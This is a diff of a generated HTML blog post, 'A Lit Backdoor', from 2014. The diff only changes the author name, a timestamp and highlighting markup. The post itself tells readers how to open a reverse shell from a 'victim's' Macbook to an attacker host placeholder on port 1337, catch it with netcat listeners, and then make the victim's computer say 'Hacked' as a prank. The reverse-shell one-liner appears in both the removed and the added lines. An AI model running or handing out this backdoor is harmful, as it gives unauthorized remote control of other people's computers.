@@ -5,7 +5,7 @@
     <title>A Lit Backdoor</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="">
-    <meta name="author" content="Marina von Steinkirch">
+    <meta name="author" content="Mia von Steinkirch">
 
     <!-- Le styles -->
     <link rel="stylesheet" href="./theme/css/bootstrap.dark.css" type="text/css" />
@@ -97,7 +97,7 @@
                 <div class="entry-content">
                 <div class="well">
 <footer class="post-info">
-<abbr class="published" title="2014-06-21T02:00:00-04:00">
+<abbr class="published" title="2014-06-21T02:00:00">
       Sat 21 June 2014 </abbr>
 
 <span class="label"> Category</span>
@@ -109,22 +109,22 @@
 </footer><!-- /.post-info -->                </div>
                 <p>I was never a big fan of Macbooks. Being a penguin user for so long, you learn to stop worrying and love love the bomb. But here is a little trick that works for both.</p>
 <p>In the victim's machine (presumably a macbook), create the reverse shell in the port 1337:</p>
-<div class="highlight"><pre><span></span>$ sh -i &gt;<span class="p">&amp;</span> /dev/tcp/ATTACKERS_IP/1337 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+<div class="highlight"><pre><span class="nv">$ </span>sh -i &gt;&amp; /dev/tcp/ATTACKERS_IP/1337 0&gt;&amp;1
 </pre></div>
 
 
 <p>Now just netcat to it. From a Linux machine:</p>
-<div class="highlight"><pre><span></span>$ nc -l -p <span class="m">1337</span>
+<div class="highlight"><pre><span class="nv">$ </span>nc -l -p 1337
 </pre></div>
 
 
 <p>Or from a Macbook:</p>
-<div class="highlight"><pre><span></span>$ nc -l <span class="m">1337</span>
+<div class="highlight"><pre><span class="nv">$ </span>nc -l 1337
 </pre></div>
 
 
 <p>You should get shell. A cute prank is making the victim's computer talk:</p>
-<div class="highlight"><pre><span></span>$ say Hacked
+<div class="highlight"><pre><span class="nv">$ </span>say Hacked
 </pre></div>
 
 
